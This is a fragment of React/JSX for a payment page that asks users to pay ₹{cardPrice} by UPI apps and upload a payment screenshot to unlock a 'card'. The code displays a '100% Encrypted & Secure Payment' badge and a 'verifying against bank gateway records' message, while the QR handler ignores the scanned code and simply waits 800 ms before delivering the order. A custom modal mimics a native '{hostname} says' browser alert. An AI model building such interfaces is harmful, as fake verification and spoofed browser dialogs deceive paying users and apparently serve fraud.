          <div className="p-3.5 rounded-xl bg-amber-950/45 border border-amber-500/35 text-amber-200/90 text-xs font-medium leading-relaxed text-center shadow-inner backdrop-blur-xs">
            Scan &amp; pay ₹{cardPrice} with PhonePe, Google Pay, or Paytm, then upload your payment screenshot below to instantly verify and unlock your card.
          </div>

          {securityNotice && (
            <div className="p-3.5 rounded-xl bg-red-950/90 border border-red-500 text-red-200 text-xs font-semibold leading-relaxed text-center shadow-lg animate-fade-in">
              ⚠️ {securityNotice}
            </div>
          )}

          {/* Upload Button */}
          <label
            htmlFor="paymentScreenshot"
            className="w-full flex items-center justify-center gap-2.5 bg-[#1976d2] hover:bg-[#1565c0] active:scale-[0.99] text-white font-bold py-3.5 px-4 rounded-xl cursor-pointer shadow-lg shadow-blue-950/40 transition-all text-sm tracking-wide"
          >
            <Upload className="w-5 h-5 text-white" />
            <span>{uploadedFileName ? `✓ Screenshot: ${uploadedFileName}` : 'Upload Payment Screenshot'}</span>
            <input
              type="file"
              id="paymentScreenshot"
              accept="image/*"
              onChange={handleFileUpload}
              className="hidden"
            />
          </label>

          {/* 100% Encrypted & Secure Payment */}
          <div className="flex items-center justify-center text-xs pt-1 px-1">
            <div className="flex items-center gap-1.5 text-emerald-400 font-semibold">
              <ShieldCheck className="w-4 h-4 text-emerald-400" />
              <span>100% Encrypted &amp; Secure Payment</span>
            </div>
          </div>

          {isVerifying && (
            <div className="p-3 rounded-xl bg-amber-500/15 border border-amber-500/30 text-amber-300 text-xs font-semibold flex items-center justify-center gap-2 animate-pulse">
              <span className="animate-spin text-base">⏳</span>
              <span>Verifying screenshot against bank gateway records...</span>
            </div>
          )}

          {uploadedFileName && !isVerifying && !completedOrder && (
            <div className="p-2.5 rounded-xl bg-emerald-950/80 border border-emerald-500 text-emerald-300 text-xs font-bold flex items-center justify-center gap-2 animate-fade-in">
              <span>✓</span>
              <span>Screenshot Received</span>
            </div>
          )}
        </div>

      </div>

      {/* Verification Failed Alert Dialog */}
      {verificationAlert.isOpen && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/65 p-4 animate-fade-in backdrop-blur-xs">
          <div className="w-full max-w-[340px] rounded-[24px] bg-[#ffffff] p-6 shadow-2xl text-left animate-scale-up border border-slate-200">
            <h3 className="text-slate-900 font-bold text-[15px] leading-snug mb-3 break-all">
              {window.location.hostname} says
            </h3>
            <p className="text-slate-700 text-[13px] leading-relaxed mb-6 font-normal">
              {verificationAlert.message}
            </p>
            <div className="flex justify-end">
              <button
                type="button"
                onClick={() => setVerificationAlert({ isOpen: false, message: '' })}
                className="text-blue-600 hover:text-blue-700 active:bg-blue-50 font-bold text-sm px-4 py-2 rounded-lg cursor-pointer transition-colors uppercase tracking-wider"
              >
                OK
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Real QR Scanner Modal */}
      <RealQrScannerModal
        isOpen={isCameraScannerOpen}
        onClose={() => setIsCameraScannerOpen(false)}
        onScanSuccess={(code) => {
          setIsCameraScannerOpen(false);
          setIsVerifying(true);
          setTimeout(() => {
            setIsVerifying(false);
            deliverCardOrder();
          }, 800);
        }}
      />
    </div>
  );
}
